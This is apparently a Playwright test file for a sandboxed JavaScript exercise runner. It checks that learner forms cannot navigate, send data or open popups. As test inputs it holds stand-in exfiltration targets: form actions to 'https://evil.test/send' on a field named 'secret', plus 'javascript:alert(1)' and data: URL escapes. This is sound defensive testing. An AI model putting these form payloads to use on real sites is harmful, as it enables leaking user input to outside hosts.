import { expect, test, type Page } from '@playwright/test';
import type { JavaScriptRunnerAdapter } from '../../src/adapters/runtime/javascript';
import type { RunnerRenderResult } from '../../src/core/runtime/contracts';
import { loadJavaScriptRunnerModulePath } from './helpers/javascriptRunnerModule';

interface FormHarness {
  runner: JavaScriptRunnerAdapter;
  frame: HTMLIFrameElement;
  revision: number;
  result: RunnerRenderResult;
}
type FormWindow = typeof window & { formHarness?: FormHarness };
const HTML =
  '<form id="form"><label for="name">名前</label><input id="name"><button id="send" type="submit">確認</button></form><p id="result">0</p>';

/** 実製品Runnerを専用iframeへ描画し、manual操作と認証Interactionで共有する。 */
async function renderForm(
  page: Page,
  script: string,
  html = HTML,
  profile: 'dom' | 'dom-form' | 'project' = 'dom-form',
) {
  const runnerModulePath = await loadJavaScriptRunnerModulePath();
  return page.evaluate(
    async ({ runnerModulePath, script, html, profile }) => {
      const host = window as FormWindow;
      let harness = host.formHarness;
      if (harness === undefined) {
        const module = (await import(/* @vite-ignore */ runnerModulePath)) as {
          JavaScriptRunnerAdapter: new () => JavaScriptRunnerAdapter;
        };
        const runner = new module.JavaScriptRunnerAdapter();
        const frame = document.createElement('iframe');
        frame.id = 'form-fixture';
        frame.style.cssText =
          'position:fixed;inset:0;width:800px;height:600px;z-index:10000;background:white';
        document.body.append(frame);
        await runner.prepare(frame);
        harness = {
          runner,
          frame,
          revision: 0,
          result: {
            exerciseSessionId: 'form',
            executionRevision: 0,
            diagnostics: [],
            console: [],
            evidence: [],
          },
        };
        host.formHarness = harness;
      }
      harness.revision += 1;
      harness.result = await harness.runner.render({
        exerciseSessionId: 'form',
        executionRevision: harness.revision,
        languageId: 'javascript',
        files: { 'index.html': html, 'script.js': script },
        assets: [],
        viewport: { id: 'desktop', width: 1280, height: 720 },
        options: {
          runtime: {
            kind: 'javascript',
            entryFile: 'script.js',
            sourceType: 'script',
            capabilityProfile: profile,
            primaryOutput: 'preview',
          },
        },
      });
      return {
        diagnostics: harness.result.diagnostics,
        sandbox: harness.frame.getAttribute('sandbox'),
        srcdoc: harness.frame.srcdoc,
      };
    },
    { runnerModulePath, script, html, profile },
  );
}

/** action単位の取消証拠を実際の認証済みRunner portから回収する。 */
async function clickSubmit(page: Page, id: string) {
  return page.evaluate(async (id) => {
    const harness = (window as FormWindow).formHarness!;
    return harness.runner.interact({
      exerciseSessionId: 'form',
      executionRevision: harness.revision,
      frameGeneration: harness.result.frameGeneration!,
      requestId: id,
      action: { id, kind: 'click', selector: '#send' },
    });
  }, id);
}

test.beforeEach(async ({ page }) => {
  await page.goto('./#/');
});
test.afterEach(async ({ page }) => {
  await page.evaluate(async () => {
    await (window as FormWindow).formHarness?.runner.dispose();
  });
});

test('projectは同じElementのcurrentTargetとasyncをclick/Keyboardで再利用しDocumentは拒否する', async ({
  page,
}) => {
  const html =
    '<button id="send" type="button" data-answer="A">回答A</button><p id="result">まだ</p>';
  const script =
    "document.querySelector('#send').addEventListener('click',event=>{const answer=event.currentTarget.dataset.answer;Promise.resolve(answer).then(value=>{document.querySelector('#result').textContent=value;});});";
  expect((await renderForm(page, script, html, 'project')).diagnostics).toEqual([]);
  const child = page.frameLocator('#form-fixture');
  await child.getByRole('button', { name: '回答A' }).click();
  await expect(child.locator('#result')).toHaveText('A');
  await renderForm(page, script, html, 'project');
  await child.getByRole('button', { name: '回答A' }).focus();
  await child.getByRole('button', { name: '回答A' }).press('Enter');
  await expect(child.locator('#result')).toHaveText('A');
  const unsafe =
    "document.querySelector('#send').getRootNode().addEventListener('click',event=>{try{console.log(event.currentTarget);}catch{console.log('caught');}});";
  expect((await renderForm(page, unsafe, html, 'project')).diagnostics).toEqual([]);
  const result = await clickSubmit(page, 'document-current-target');
  expect(result.diagnostics).toEqual(
    expect.arrayContaining([
      expect.objectContaining({
        code: 'javascript-current-target-unsupported',
        kind: 'unsupported',
      }),
    ]),
  );
});

test('Form専用profileでnative click/Enterが届き、取消の有無を区別して既存domへ戻せる', async ({
  page,
}) => {
  const source =
    "let count=0;document.querySelector('#form').addEventListener('submit',event=>{event.preventDefault();count+=1;document.querySelector('#result').textContent=String(count);});";
  const initial = await renderForm(page, source);
  expect(initial.diagnostics).toEqual([]);
  expect(initial.sandbox).toBe('allow-scripts allow-forms');
  expect(initial.srcdoc).toContain("form-action 'none'");
  const child = page.frameLocator('#form-fixture');
  await child.getByRole('button', { name: '確認' }).click();
  await expect(child.locator('#result')).toHaveText('1');
  await child.getByLabel('名前').fill('春');
  await child.getByLabel('名前').press('Enter');
  await expect(child.locator('#result')).toHaveText('2');
  expect((await clickSubmit(page, 'scenario')).submitEvidence).toBe('prevented');
  await expect(child.locator('#result')).toHaveText('3');

  await renderForm(page, source.replace('event.preventDefault();', ''));
  expect((await clickSubmit(page, 'missing-cancel')).submitEvidence).toBe('not-prevented');
  await expect(child.locator('#result')).toHaveText('1');
  const ordinary = await renderForm(page, source, HTML, 'dom');
  expect(ordinary.sandbox).toBe('allow-scripts');
  expect(ordinary.diagnostics).toEqual([]);
  expect((await clickSubmit(page, 'ordinary')).submitEvidence).toBe('unsupported');
  // WebKitはallow-formsなしでもsubmit Eventを届ける。既存profileの契約はsandboxと非採点を固定する。
  expect(
    page
      .frames()
      .find((frame) => frame.parentFrame() !== null)!
      .url(),
  ).toBe('about:srcdoc');
});

test('Formの送信先属性とhandler取消の有無に関係なく遷移・通信・popupを起こさない', async ({
  page,
}) => {
  const requests: string[] = [];
  const popups: string[] = [];
  const parentUrl = page.url();
  await page.route('**/*', async (route) => {
    if (
      route.request().url().startsWith('http') &&
      (route.request().isNavigationRequest() ||
        !route.request().url().startsWith(new URL(parentUrl).origin))
    ) {
      requests.push(route.request().url());
      await route.abort();
      return;
    }
    await route.continue();
  });
  page.on('popup', (popup) => {
    popups.push(popup.url());
  });
  const schemes = [
    'https://evil.test/send',
    'http://evil.test/send',
    'javascript:alert(1)',
    'data:text/html,escape',
    '/form-escape',
    '#escape',
  ];
  for (const [index, destination] of schemes.entries()) {
    const target = ['_top', '_parent', '_blank', 'named'][index % 4]!;
    const html = `<form id="form" action="${destination}" method="${index % 2 ? 'post' : 'get'}" target="${target}"><label for="name">名前</label><input id="name" name="secret"><button id="send" type="submit" formaction="${destination}" formtarget="${target}" formmethod="post">確認</button></form><p id="result">0</p>`;
    const source = `let count=0;const form=document.querySelector('#form');form.addEventListener('submit',event=>{${index % 2 ? 'event.stopImmediatePropagation();' : 'event.stopPropagation();'}count+=1;document.querySelector('#result').textContent=String(count);});`;
    const rendered = await renderForm(page, source, html);
    expect(rendered.diagnostics.some((diagnostic) => diagnostic.severity === 'error')).toBe(false);
    const child = page.frameLocator('#form-fixture');
    await expect(child.locator('#form')).not.toHaveAttribute('action');
    await expect(child.locator('#send')).not.toHaveAttribute('formaction');
    const frameUrl = page
      .frames()
      .find((frame) => frame.parentFrame() !== null)!
      .url();
    await child.getByRole('button', { name: '確認' }).click();
    await expect(child.locator('#result')).toHaveText('1');
    await child.getByLabel('名前').fill('test');
    await child.getByLabel('名前').press('Enter');
    await expect(child.locator('#result')).toHaveText('2');
    expect((await clickSubmit(page, `attack-${String(index)}`)).submitEvidence).toBe(
      'not-prevented',
    );
    expect(page.url()).toBe(parentUrl);
    expect(
      page
        .frames()
        .find((frame) => frame.parentFrame() !== null)!
        .url(),
    ).toBe(frameUrl);
  }
  expect(requests).toEqual([]);
  expect(popups).toEqual([]);
});

test('FormのObject options・送信API・動的送信先は非対応/安全診断で実行を止める', async ({
  page,
}) => {
  for (const statement of [
    "form.addEventListener('submit',event=>event.preventDefault(),{passive:true});",
    "form.action='https://evil.test';",
    "form.setAttribute('action','https://evil.test');",
    'form.submit();',
    'form.requestSubmit();',
  ]) {
    const result = await renderForm(
      page,
      `const form=document.querySelector('#form');${statement}`,
    );
    expect(
      result.diagnostics.some(
        ({ kind, severity }) =>
          severity === 'error' && (kind === 'unsupported' || kind === 'security'),
      ),
    ).toBe(true);
  }
});

/** 製品guardを変更せず、製品生成CSPだけを抜き出した隔離文書で独立防御を確認する。 */
test('製品CSPはguardが存在しない隔離Formでも送信先を遮断する', async ({ page }) => {
  const rendered = await renderForm(page, 'document.querySelector("#result").textContent="ready";');
  const policy = await page.evaluate(
    (srcdoc) =>
      new DOMParser()
        .parseFromString(srcdoc, 'text/html')
        .querySelector('meta[http-equiv="Content-Security-Policy"]')!
        .getAttribute('content')!,
    rendered.srcdoc,
  );
  const requests: string[] = [];
  await page.route('**/csp-escape**', async (route) => {
    requests.push(route.request().url());
    await route.abort();
  });
  await page.evaluate((policy) => {
    const frame = document.createElement('iframe');
    frame.id = 'csp-fixture';
    frame.setAttribute('sandbox', 'allow-scripts allow-forms');
    frame.style.cssText =
      'position:fixed;inset:0;width:800px;height:600px;z-index:10001;background:white';
    const doc = document.implementation.createHTMLDocument();
    const meta = doc.createElement('meta');
    meta.httpEquiv = 'Content-Security-Policy';
    meta.content = policy;
    doc.head.append(meta);
    doc.body.innerHTML =
      '<form action="https://evil.test/csp-escape"><input aria-label="名前"><button>確認</button></form>';
    frame.srcdoc = '<!doctype html>' + doc.documentElement.outerHTML;
    document.body.append(frame);
  }, policy);
  const child = page.frameLocator('#csp-fixture');
  await child.locator('form').evaluate((form) => {
    let blocked = 0;
    form.ownerDocument.addEventListener('securitypolicyviolation', (event) => {
      if (event.violatedDirective === 'form-action') {
        blocked += 1;
        form.setAttribute('data-blocked', String(blocked));
      }
    });
  });
  await child.getByRole('button', { name: '確認' }).click();
  await expect(child.locator('form')).toHaveAttribute('data-blocked', '1');
  await child.getByLabel('名前').press('Enter');
  await expect(child.locator('form')).toHaveAttribute('data-blocked', '2');
  await expect(child.getByRole('button', { name: '確認' })).toBeVisible();
  expect(requests).toEqual([]);
  expect(
    page
      .frames()
      .find((frame) => frame.name() === 'csp-fixture')
      ?.url(),
  ).toBe('about:srcdoc');
});

test('Form取消guardが設置できない実frameでは学習codeを開始せずsystem診断を返す', async ({
  page,
}) => {
  await page.addInitScript(() => {
    if (window === window.parent) return;
    Object.defineProperty(Event.prototype, 'preventDefault', {
      configurable: false,
      writable: false,
    });
  });
  const result = await renderForm(
    page,
    "document.querySelector('#result').textContent='learner-started';console.log('learner-started');",
  );
  expect(result.diagnostics).toContainEqual(
    expect.objectContaining({ kind: 'system', code: 'javascript-submit-setup' }),
  );
  const observed = await page.evaluate(() => (window as FormWindow).formHarness!.result);
  expect(observed.console).toEqual([]);
  expect(observed.evidence).toContainEqual({ id: 'javascript.executed', value: false });
  await expect(page.frameLocator('#form-fixture').locator('#result')).toHaveText('0');
});
